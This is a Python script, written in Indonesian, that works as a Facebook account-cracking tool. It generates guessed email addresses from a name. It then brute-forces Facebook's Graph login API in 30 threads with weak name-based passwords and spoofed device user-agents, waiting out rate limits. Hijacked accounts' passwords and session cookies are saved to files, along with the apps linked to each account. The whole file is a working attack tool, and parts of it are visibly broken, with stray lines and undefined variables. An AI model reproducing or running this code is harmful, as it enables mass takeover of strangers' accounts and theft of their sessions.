import os, sys, re, time, requests, calendar, random, bs4, uuid, json, subprocess, base64
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from datetime import date,datetime
from requests.exceptions import ConnectionError
ses = requests.Session()


from rich.panel import Panel
from rich.tree import Tree
from rich import print as yoshii___ganteng___
from rich.console import Console
from rich.table import Table
from rich.columns import Columns
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
console = Console() 


M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH

P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAUU
K = '\x1b[1;93m' # KUNING
R = random.choice([M,H,K])


sekarang = calendar.timegm(time.gmtime(time.time()))
tampung = []
ugent = []


try:
	file_color = open("data/theme_color","r").read()
	color_text = file_color.split("|")[0]
	color_panel = file_color.split("|")[1]
except:
	color_text = "[#00C8FF]"
	color_panel = "#00C8FF"


android_version = subprocess.check_output("getprop ro.build.version.release",shell=True).decode("utf-8").replace("\n","")
subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[1].replace("\n","")
subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[0].replace("\n","")
versi_app = str(random.randint(111111111,999999999))


def yoshii___pacar___nova():
	rr = random.randint
	rc = random.choice
	ayang___nova___cantik___bangett = random.choice(['2.3.0','3.0.1','4.2.2','5.0.1','6.1.1','7.0.0','8.2.0','9.0','10','11','12'])
	ayang___nova___lopyu = random.choice(['LMY47X','LRX22G','R16NW','MMB29T','PPR1.180610.011','MMB29M','NRD90M','O11019'])
	yoshii___love___nova = random.randrange(1000000, 9999999)
	yoshii_nova = random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	vivo = random.choice(["V2022","V2023","V2028","V2024","V2025","V2026","V2029","V2030","V2031"])
	dev = f'{yoshii___love___nova}{yoshii_nova}{yoshii_nova}'
	ua = f"Davik/2.1.0 (Linux; U; Android {ayang___nova___cantik___bangett}; {vivo} Build/{ayang___nova___lopyu}) [FBAN/MessengerLite;FBAV/{str(rr(40,375))}.319.0.0.2.146;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/332275123;FBCR/XL Axiata;FBMF/vivo;FBBD/vivo;FBDV/{vivo};FBSV/{str(rr(9,13))};FBCA/armeabi-v7a:armeabi;FBDM/"+"{density=2.25,height=2048,width=2048};]"
	return ua
class Logo:
	
	
	def nova___cantik___banget___pacarnya___yoshii(self):
		if "linux" in sys.platform.lower():
			try:os.system("clear")
			except:pass
		elif "win" in sys.platform.lower():
			try:os.system("cls")
			except:pass
		else:
			try:os.system("clear") 
			except:pass

	
	def logonya(self):
		self.nova___cantik___banget___pacarnya___yoshii()
		yoshii___ganteng___(Panel(f"""                              
,--.   ,--.,--.   ,--.,--.    
 \  `.'  / |   `.'   ||  |    Created by 
  .'    \  |  |'.'|  ||  |    Laban alex
 /  .'.  \ |  |   |  ||  '--. v.0.1.1
'--'   '--'`--'   `--'`-----' 
                              """,width=52,style=f"{color_panel}"))
	

class Login:
	

	
	def menu_login(self):
		Logo().logonya()
		
		yoshii___ganteng___(Panel(f"""{P2}[{color_text}01{P2}]. login menggunakan cookie facebook
[{color_text}02{P2}]. login menggunakan kredensial""",width=80,padding=(0,15),style=f"{color_panel}"))
		login = console.input(f" {H2}• {P2}pilih menu : ")
		if login in["1","01"]:
			yoshii___ganteng___(Panel(f"""{P2}silahkan masukan cookiemu disini dan pastikan autentikasi tidak aktif""",width=80,style=f"{color_panel}"))
			cookie = console.input(f" {H2}• {P2}masukan cookie : ")
			
			self.login_cookie(cookie)
		else:
			exit(yoshii___ganteng___(Panel(f"""{M2}🙏 maaf fitur ini belum tersedia, silahkan menunggu update selanjutnya""",width=80,style=f"{color_panel}")))
			
	
	def login_cookie(self,cookie):
		try:
			url = ses.get("https://mbasic.facebook.com/",cookies={"cookie": cookie}).text
			if "Apa yang Anda pikirkan sekarang" in url:
				pass
			else:
				for z in url.find_all("a",href=True):
					if "Tidak, Terima Kasih" in z.text:
						get = ses.get("https://mbasic.facebook.com"+z["href"],cookies={"cookie": cookie})
						parsing = parser(get.text,"html.parser")
						action = parsing.find("form",{"method":"post"})["action"]
						data = {
							"fb_dtsg":re.search('name="fb_dtsg" value="(.*?)"', str(get.text)).group(1),
							"jazoest":re.search('name="jazoest" value="(.*?)"', str(get.text)).group(1),
							"submit": "OK, Gunakan Data"
						}
						post = ses.post("https://mbasic.facebook.com"+action,data=data,cookies={"cookie": cookie})
						break
			open("data/cookie","w").write(cookie)
			Menu().menu()
		except:
			yoshii___ganteng___(Panel(f"""{M2}cookie invalid, silahkan gunakan cookie lain yang masih baru atau fresh""",width=80,style=f"{color_panel}"))
			sys.exit()
		
	
	def ubah_bahasa(self,cookie):
		try:
			url = ses.get("https://mbasic.facebook.com/language/",cookies={"cookie": cookie})
			parsing = parser(url.text,"html.parser")
			for x in parsing.find_all("form",{"method":"post"}):
				if "Bahasa Indonesia" in str(x):
					data = {
						"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(url.text)).group(1),
						"jazoest" : re.search('name="jazoest" value="(.*?)"', str(url.text)).group(1),
						"submit"  : "Bahasa Indonesia"
					}
					post = ses.post("https://mbasic.facebook.com"+x["action"],data=data,cookies={"cookie": cookie})
		except:
			pass
		

class Menu:
	
	
	def __init__(self):
		self.men = []
		self.id = []
		self.ip = ses.get("http://ip-api.com/json/").json()["query"]
		

	
	def cek_login(self,cookie):
		try:
			url = ses.get("https://mbasic.facebook.com/profile.php",cookies=cookie).text
			nama = re.findall("<title>(.*?)</title>",url)[0]
			if "Konten Tidak Ditemukan" in nama:
				try:os.remove("data/cookie")
				except:pass
				Login().menu_login()
			else:
				return nama
		except ConnectionError:
			yoshii___ganteng___(Panel(f"""{M2}koneksi internet kamu bermasalah, silahkan cek koneksi kamu kembali""",width=80,style=f"{color_panel}"))
			exit()
			
	
	def menu(self):
		Logo().logonya()
		
		
		try:
			cok = open("data/cookie","r").read()
			cookie = {"cookie": cok}
			nama = self.cek_login(cookie)
		except:
			try:os.remove("data/cookie")
			except:pass
			Login().menu_login()
		
		
		yoshii___ganteng___(f' • Hallo  : {nama} \n • Ip mu  : {self.ip}')
		yoshii___ganteng___(f'')
		yoshii___ganteng___(f"""  •  Silahkan ketik {K2} email {P2} untuk memulai crack""")
		menu = console.input(f"""  │
  ╰─> ketik disini : """)
			
		
		if menu in["Email","email"]:
			yoshii___ganteng___(f"""{P2}    • masukan nama dan format email gunakan '@' di awal contoh @gmail.com""")
			user = console.input(f"  ╰─> {P2}nama email : ")
			format = console.input(f"  ╰─> {P2}format : ")
			limit = console.input(f"  ╰─> {P2}limit : ")
			Dump(cookie).Dump_Email(user,format,limit)
			Crack().atursandi()
			
		

class Dump:
	
	
	def __init__(self,cookie):
		self.cookie = cookie
			
	
	def GetUser(self):
		try:
			url = ses.get("https://mbasic.facebook.com/profile.php",cookies=self.cookie).text
			uid = re.findall('name="target" value="(.*?)"',url)[0]
			return uid
		except:
			pass

	
	
	def Dump_Email(self,nama,format,limit):
		try:
			for z in range(int(limit)):
				if len(nama.split()) > 1:
					email = str(nama.split()[0])+str(nama.split()[1])+str(z)+str(format)+"<=>"+str(nama.split()[0])+" "+str(nama.split()[1])
				else:
					email = str(nama)+str(z)+str(format)+"<=>"+str(nama)
				if email in tampung:pass
				else:tampung.append(email)
		except:pass
		


class Crack:
	
	
	def __init__(self):
		self.loop = 0
		self.ok = []
		self.cp = []
		self.apk = []
		self.aktif = []
		self.kadaluwarsa = []
		self.hari_ini = datetime.now().strftime("%d-%B-%Y")
		
	
	def atursandi(self):
		yoshii___ganteng___(f"""  ╰─> {P2}Anjay kamu berhasil mengumpulkan {len(tampung)} id""")
		yoshii___ganteng___(f'')
		set = console.input(f"  ╰─> {P2}apakah kamu ingin menggunakan sandi manual?(y/n) : ")
		
		
		if set in["Y","y"]:
			yoshii___ganteng___(f"""  ╰─> {P2}silahkan buat katasandi dengan , (koma) sebagai pemisah tiap katasandi""")
			pwx = console.input(f" {H2}  ╰─> {P2}buat katasandi : ").split(",")
			if len(pwx)<=5:
				yoshii___ganteng___(f"""  ╰─> {M2}katasandi harus minimal 6 huruf""")
				exit()
				yoshii___ganteng___(f'')
			app = console.input(f"  ╰─> {P2}apakah kamu ingin memunculkan aplikasi terkait?(y/n) : ")
			if app in["Y","y"]:
				self.apk.append("muncul")
			else:
				self.apk.append("kontol anjing")
			self.manual(pwx)
		
		
		else:
			yoshii___ganteng___(f'')
			app = console.input(f"  ╰─> {P2}apakah kamu ingin memunculkan aplikasi terkait?(y/n) : ")
			if app in["Y","y"]:
				self.apk.append("muncul")
			else:
				self.apk.append("kontol anjing")
			self.otomatis()
		
	
	def manual(self,pw):
		global prog,des
		prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
		des = prog.add_task('',total=len(tampung))
		with prog:
			with ThreadPoolExecutor(max_workers=30) as fall:
				self.simpan_hasil()
				for data in tampung:
					user = data.split("<=>")[0]
					nama = data.split("<=>")[1]
					pwx = pw
					fall.submit(self.metode_api,user,pwx)
		yoshii___ganteng___(Panel(f"""{P2}berhasil crack total {len(tampung)} id, dengan hasil OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}""",width=80,padding=(0,8),style=f"{color_panel}"))
		sys.exit()
						
	
	def otomatis(self):
		global prog,des
		prog = Progress(TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
		des = prog.add_task('',total=len(tampung))
		with prog:
			with ThreadPoolExecutor(max_workers=30) as fall:
				self.simpan_hasil()
				for data in tampung:
					try:
						pwx = []
						user = data.split("<=>")[0]
						nama = data.split("<=>")[1]
						depan = nama.split(" ")[0]
						if len(nama)<=5:
							if len(depan)<3:
								pass 
							else:
								pwx.append(depan+"123")
								pwx.append(depan+"12345")
						else:
							if len(depan)<3:
								pwx.append(nama)
							else:
								pwx.append(nama)
								pwx.append(depan+"123")
								pwx.append(depan+"12345")
							belakang = nama.split(" ")[1]
							if len(belakang)<3:
								pwx.append(depan+belakang)
							else:
								pwx.append(depan+belakang)
								pwx.append(belakang+"123")
								pwx.append(belakang+"12345")
						fall.submit(self.metode_api,user,pwx)
					except:
						fall.submit(self.metode_api,user,pwx)
		yoshii___ganteng___(Panel(f"""{P2}berhasil crack total {len(tampung)} id, dengan hasil OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}""",width=80,padding=(0,8),style=f"{color_panel}"))
		sys.exit()
							
	
	def metode_api(self,email,pwx):
		prog.update(des,description=f" {H2}•{P2} yoshii {H2}good{P2} {str(self.loop)}/{len(tampung)} OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}")
		prog.advance(des)
		try:
			for pw in pwx:
				pw = pw.lower()
				
				ua = yoshii___pacar___nova()
				neg = random.choice(["en_US","en_GB","id_ID","fr_CH","ar_BH","ar_DJ","en_LC","en_SG","ja_JP"])
				params = {
					"access_token": "6628568379|c1e620fa708a1d5696fb991c1bde5662",
					"sdk_version": f"{str(random.randint(1,26))}", 
					"email": email,
					"locale": "en_US",
					"password": pw,
					"sdk": "android",
					"generate_session_cookies": "1",
					"sig": "4f648f21fb58fcd2aa1c65f35f441ef5"
				}
				headers = {
					"Host": "graph.facebook.com",
					"x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),
					"x-fb-sim-hni": str(random.randint(20000, 40000)),
					"x-fb-net-hni": str(random.randint(20000, 40000)),
					"x-fb-connection-quality": "EXCELLENT",
					"user-agent": ua,
					"content-type": "application/x-www-form-urlencoded",
					"x-fb-http-engine": "Liger"
				}
				post = ses.post("https://graph.facebook.com/auth/login",params=params, headers=headers, allow_redirects=False)
				if "session_key" in post.text and "EAA" in post.text:
					coki = ";".join(i["name"]+"="+i["value"] for i in post.json()["session_cookies"])
					sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
					cookie = f"sb={sb};{coki}"
					user = re.findall("c_user=(\d+)",cookie)[0]
					if user in self.ok or user in self.cp:
						break
					else:
						self.ok.append(user)
						if "muncul" in self.apk:
							self.get_apk(user,pw,cookie)
						else:
							tre = Tree(Panel.fit(f"""{H2}{user}|{pw}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
							api = Tree(Panel.fit(f"{H2}{cookie}={neg}{P2}",style=f"{color_panel}"),guide_style="bold grey100")
							#ua = Tree(Panel.fit(f"{H2}{ua}{P2}",style=f"{color_panel}"),guide_style="bold grey100")
							yoshii___ganteng___(tre)
							yoshii___ganteng___(api)
							#yoshii___ganteng___(ua)
						open(f"OK/{self.hari_ini}.txt","a").write(f"{user}|{pw}|{cookie}\n")
						open(f"OK/facebook.{self.hari_ini}.txt","a").write(f"Facebook.com/{user}|{pw}\n")
						break
				elif "User must verify their account" in post.text:
					user = post.json()["error"]["error_data"]["uid"]
					if user in self.ok or user in self.cp:
						break
					else:
						self.cp.append(user)
						tree = Tree(Panel.fit(f"""{K2}{user}|{pw}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
						yoshii___ganteng___(tree)
						open(f"CP/{self.hari_ini}.txt","a").write(f"{user}|{pw}\n")
						open(f"CP/facebook.{self.hari_ini}.txt","a").write(f"Facebook.com/{user}|{pw}\n")
						break
				elif "Calls to this api have exceeded the rate limit. (613)" in post.text:
					prog.update(des,description=f" {H2}•{P2} crack {M2}spam{P2} {str(self.loop)}/{len(tampung)} OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}")
					prog.advance(des)
					time.sleep(30)
				else:continue
		
		except ConnectionError:
			time.sleep(30)
			self.metode_api(user,pwx)
		self.loop +=1

	
	def simpan_hasil(self):
		yoshii___ganteng___(Panel(f"""\r{P2}hasil crack ok tersimpan ke : OK/{self.hari_ini}.txt
{P2}hasil crack ok tersimpan ke : CP/{self.hari_ini}.txt""",width=80,padding=(0,10),style=f"{color_panel}"))
	
	
	def get_apk(self,user,pw,cookie):
		
		
		try:
			url = ses.get("https://mbasic.facebook.com/",cookies={"cookie": cookie}).text
			if "Apa yang Anda pikirkan sekarang" in url:
				pass
			else:
				for z in url.find_all("a",href=True):
					if "Tidak, Terima Kasih" in z.text:
						get = ses.get("https://mbasic.facebook.com"+z["href"],cookies={"cookie": cookie})
						parsing = parser(get.text,"html.parser")
						action = parsing.find("form",{"method":"post"})["action"]
						data = {
							"fb_dtsg":re.search('name="fb_dtsg" value="(.*?)"', str(get.text)).group(1),
							"jazoest":re.search('name="jazoest" value="(.*?)"', str(get.text)).group(1),
							"submit": "OK, Gunakan Data"
						}
						post = ses.post("https://mbasic.facebook.com"+action,data=data,cookies={"cookie": cookie})
						break
		except:pass
			
		l
		aktip = Tree("Aplikasi Aktif",guide_style="bold grey100")
		self.apkaktif("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookie)
		if len(self.aktif)==0:
			aktip.add(f"{P2}tidak ada aplikasi yang terkait")
		else:
			for apk in self.aktif:
				aktip.add(f"{H2}{apk}{P2}")
				
		
		kadalu = Tree("Aplikasi Kadaluwarsa",guide_style="bold grey100")
		self.apkkadaluwarsa("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookie)
		if len(self.kadaluwarsa)==0:
			kadalu.add(f"{P2}tidak ada aplikasi yang terkait")
		else:
			for apk in self.kadaluwarsa:
				kadalu.add(f"{M2}{apk}{P2}")
			
		
		tree = Tree(Panel.fit(f"""{H2}{user}|{pw}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
		tree.add(aktip)
		tree.add(kadalu)
		tree.add(Panel(f"{H2}{cookie}{P2}",style=f"{color_panel}"))
		yoshii___ganteng___(tree)
		
	
	def apkaktif(self,url,cookie):
		try:
			data = parser(ses.get(url,cookies={"cookie": cookie}).text,"html.parser")
			for apk in data.find_all("h3"):
				if "Ditambahkan" in apk.text:
					self.aktif.append(f"{str(apk.text).replace('Ditambahkan',' Ditambahkan')}")
				else:continue
			next = "https://mbasic.facebook.com"+data.find("a",string="Lihat Lainnya")["href"]
			self.apkaktif(next,cookie)
		except:pass
		
	
	def apkkadaluwarsa(self,url,cookie):
		try:
			data = parser(ses.get(url,cookies={"cookie": cookie}).text,"html.parser")
			for apk in data.find_all("h3"):
				if "Kedaluwarsa" in apk.text:
					self.kadaluwarsa.append(f"{str(apk.text).replace('Kedaluwarsa',' Kedaluwarsa')}")
				else:continue
			next = "https://mbasic.facebook.com"+data.find("a",string="Lihat Lainnya")["href"]
			self.apkkadaluwarsa(next,cookie)
		except:pass
	
		
		try:
			files = self.file[int(result)-1]
			totalhasil = open(f"{folder}/{files}","r").read().splitlines()
		except:
			yoshii___ganteng___(Panel(f"""{M2}file yang anda masukan tidak tersedia atau input kamu tidak benar""",width=80,style=f"{color_panel}"))
			exit()
		nama_file = (f"{files}").replace("-", " ").replace(".txt", "")
		yoshii___ganteng___(Panel(f"""{P2}nama file hasil crack : {nama_file} dan terdapat total akun : {len(totalhasil)}""",width=80,style=f"{color_panel}"))
		for akun in totalhasil:
			user = akun.split("|")[0]
			pw = akun.split("|")[1]
			tree = Tree(" ",guide_style=f"{color_panel}")
			if folder=="OK":
				cookie = akun.split("|")[2]
				tree.add(f"\r{H2}{user}|{pw}{P2} ")
			else:
				print(f"Facebook.com/{user}|{pw}")
		yoshii___ganteng___(Panel(f"""{P2} berhasil mengecek dan mendapatkan total {len(totalhasil)} akun dari file""",width=80,padding=(0,7),style=f"{color_panel}"))
		exit()
		
	
	def tampil_cookie(self):
		now = datetime.now()
		hari = now.day+int(30)
		if hari > 30:hari = hari-30
		bulan = now.month+1
		if bulan > 12:bulan = bulan-12
		if now.month+1 > 12:tahun = now.year+1
		data = date(year=tahun,month=bulan,day=hari)
		aktif = data.strftime("%d %B %Y")
		console.print(f" {H2}• {P2}aktif sampai : {aktif}")
		yoshii___ganteng___(Panel(f"""{H2}{self.cookie.get('cookie')}""",width=80,style=f"{color_panel}"))
		sys.exit()
		

class Session:
	
	
	def generate_ugent(self):
		ugent = f"Davik/2.1.0 (Linux; U; Android {android_version}; {model_device} Build/{build_device}) [FBAN/MessengerLite;FBAV/{versi_chrome};FBPN/com.facebook.mlite;FBLC/{language};FBBV/{versi_app};FBCR/{simcard};FBMF/{merk_device};FBBD/{brand_device};FBDV/{model_device};FBSV/{android_version};FBCA/{cpu_device};FBDM/"+str(large_device)+";]"
		return ugent		
		
if __name__=="__main__":
	try:os.mkdir("OK")
	except:pass
	try:os.mkdir("CP")
	except:pass
	try:os.mkdir("data")
	except:pass
	Menu().menu()

